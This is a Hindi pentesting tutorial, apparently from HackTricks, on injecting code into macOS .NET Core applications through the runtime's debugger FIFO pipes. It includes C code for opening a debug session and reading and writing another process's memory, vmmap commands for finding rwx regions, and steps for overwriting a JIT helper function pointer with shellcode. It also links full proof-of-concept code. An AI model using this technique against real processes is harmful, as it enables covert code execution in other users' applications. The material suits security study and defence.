# macOS .Net एप्लिकेशन इंजेक्शन

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें।**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>

## .NET कोर डिबगिंग <a href="#net-core-debugging" id="net-core-debugging"></a>

### **डिबगिंग सत्र स्थापित करें** <a href="#net-core-debugging" id="net-core-debugging"></a>

[**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp) डिबगर से डिबगी कम्युनिकेशन को संभालने के लिए जिम्मेदार है।\
यह [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127) में [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27) को कॉल करके .Net प्रक्रिया में 2 नाम के पाइप बनाता है (एक **`-in`** में समाप्त होगा और दूसरा **`-out`** में और नाम का बाकी हिस्सा समान होगा)।

तो, यदि आप उपयोगकर्ताओं के **`$TMPDIR`** में जाते हैं, तो आप .Net एप्लिकेशनों को डिबग करने के लिए उपयोग कर सकते हैं **डिबगिंग फाइफो** को खोज सकते हैं:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259) फ़ंक्शन एक डिबगर से कम्युनिकेशन को संभालेगा।

एक डिबगर को करने के लिए पहली चीज है **एक नई डिबगिंग सत्र बनाना**। इसे **`out` पाइप** के माध्यम से एक संदेश भेजकर किया जाता है जिसमें एक `MessageHeader` संरचना की शुरुआत होती है, जिसे हम .NET स्रोत से प्राप्त कर सकते हैं:
```c
struct MessageHeader
{
MessageType   m_eType;        // Type of message this is
DWORD         m_cbDataBlock;  // Size of data block that immediately follows this header (can be zero)
DWORD         m_dwId;         // Message ID assigned by the sender of this message
DWORD         m_dwReplyId;    // Message ID that this is a reply to (used by messages such as MT_GetDCB)
DWORD         m_dwLastSeenId; // Message ID last seen by sender (receiver can discard up to here from send queue)
DWORD         m_dwReserved;   // Reserved for future expansion (must be initialized to zero and
// never read)
union {
struct {
DWORD         m_dwMajorVersion;   // Protocol version requested/accepted
DWORD         m_dwMinorVersion;
} VersionInfo;
...
} TypeSpecificData;

BYTE                    m_sMustBeZero[8];
}
```
एक नई सत्र अनुरोध के मामले में, यह संरचना निम्नलिखित रूप में पूर्ण की जाती है:
```c
static const DWORD kCurrentMajorVersion = 2;
static const DWORD kCurrentMinorVersion = 0;

// Set the message type (in this case, we're establishing a session)
sSendHeader.m_eType = MT_SessionRequest;

// Set the version
sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;

// Finally set the number of bytes which follow this header
sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
```
एक बार निर्मित करने के बाद, हम `write` सिस्टम कॉल का उपयोग करके इसे लक्ष्य को भेजते हैं:
```c
write(wr, &sSendHeader, sizeof(MessageHeader));
```
अपने हेडर के बाद, हमें `sessionRequestData` संरचना को भेजने की आवश्यकता होती है, जिसमें हमारी सत्र की पहचान के लिए एक GUID होता है:
```c
// All '9' is a GUID.. right??
memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));

// Send over the session request data
write(wr, &sDataBlock, sizeof(SessionRequestData));
```
हमारा सत्र अनुरोध भेजने के बाद, हम **`out` पाइप से एक हैडर पढ़ते हैं** जो यह दिखाएगा कि क्या हमारा डीबगर सत्र स्थापित करने का अनुरोध **सफल** हुआ है या नहीं:
```c
read(rd, &sReceiveHeader, sizeof(MessageHeader));
```
### मेमोरी पढ़ें

डीबगिंग सत्र स्थापित करके [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896) संदेश प्रकार का उपयोग करके मेमोरी को **पढ़ना** संभव है। कुछ मेमोरी पढ़ने के लिए मुख्य कोड आवश्यक होगा:
```c
bool readMemory(void *addr, int len, unsigned char **output) {

*output = (unsigned char *)malloc(len);
if (*output == NULL) {
return false;
}

sSendHeader.m_dwId++; // We increment this for each request
sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
sSendHeader.m_eType = MT_ReadMemory; // The type of request we are making
sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to read from
sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
sSendHeader.m_cbDataBlock = 0;

// Write the header
if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Read the response header
if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Make sure that memory could be read before we attempt to read further
if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
return false;
}

memset(*output, 0, len);

// Read the memory from the debugee
if (read(rd, *output, sReceiveHeader.m_cbDataBlock) < 0) {
return false;
}

return true;
}
```
यहाँ पाया गया प्रूफ ऑफ कॉन्सेप्ट (POC) कोड [यहाँ](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b) मिलता है।

### मेमोरी लिखें
```c
bool writeMemory(void *addr, int len, unsigned char *input) {

sSendHeader.m_dwId++; // We increment this for each request
sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
sSendHeader.m_eType = MT_WriteMemory; // The type of request we are making
sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to write to
sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
sSendHeader.m_cbDataBlock = len;

// Write the header
if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Write the data
if (write(wr, input, len) < 0) {
return false;
}

// Read the response header
if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Ensure our memory write was successful
if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
return false;
}

return true;

}
```
इसे करने के लिए इस्तेमाल किए जाने वाले POC कोड यहां मिल सकता है [यहां](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5)।

### .NET कोर कोड निष्पादन <a href="#net-core-code-execution" id="net-core-code-execution"></a>

पहली चीज है उदाहरण के लिए **`rwx`** के साथ चल रहे मेमोरी क्षेत्र की पहचान करना, जहां शेलकोड को चलाने के लिए सहेजा जा सकता है। इसे आसानी से किया जा सकता है:
```bash
vmmap -pages [pid]
vmmap -pages 35829 | grep "rwx/rwx"
```
तो निष्पादन को ट्रिगर करने के लिए यह आवश्यक होगा कि कुछ ऐसी जगह का पता चले जहां एक फंक्शन पॉइंटर संग्रहीत है और उसे ओवरराइट किया जा सके। **डायनेमिक फंक्शन टेबल (DFT)** के भीतर एक पॉइंटर को ओवरराइट करना संभव है, जिसे .NET कोर रनटाइम द्वारा जिट संकलन के लिए सहायक फंक्शन प्रदान करने के लिए उपयोग किया जाता है। समर्थित फंक्शन पॉइंटरों की सूची [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h) में मिल सकती है।

x64 संस्करणों में, इसे **सिग्नेचर हंटिंग** तकनीक का उपयोग करके **`libcorclr.dll`** में **`_hlpDynamicFuncTable`** प्रतीक के संदर्भ के लिए खोजने के लिए सीधा है। जिसे हम डिरेफरेंस कर सकते हैं:

<figure><img src="../../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

इसके बाद करने के लिए बचा है कि हमें अपनी सिग्नेचर खोज के लिए एक पते का पता लगाना है। इसके लिए, हम एक अन्य प्रकट डीबगर फंक्शन, **`MT_GetDCB`** का उपयोग करते हैं। यह लक्षित प्रक्रिया पर उपयोगी जानकारी कई बिट्स वापस करता है, लेकिन हमारे मामले में, हमें एक मददकर्ता फंक्शन के पते, **`m_helperRemoteStartAddr`** को संबंधित फील्ड में रिटर्न किए जाने वाले एक क्षेत्र में रुचि है। इस पते का उपयोग करके, हम जानते हैं कि लक्षित प्रक्रिया मेमोरी में **`libcorclr.dll` कहां स्थित है** और हम DFT की खोज शुरू कर सकते हैं।

इस पते को जानने के बाद हम अपने शेलकोड के साथ फंक्शन पॉइंटर को ओवरराइट कर सकते हैं।

PowerShell में इंजेक्शन करने के लिए उपयोग किए गए पूर्ण POC कोड [यहां](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6) मिल सकता है।

## संदर्भ

* यह तकनीक [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/) से ली गई है

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण का उपयोग करना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>
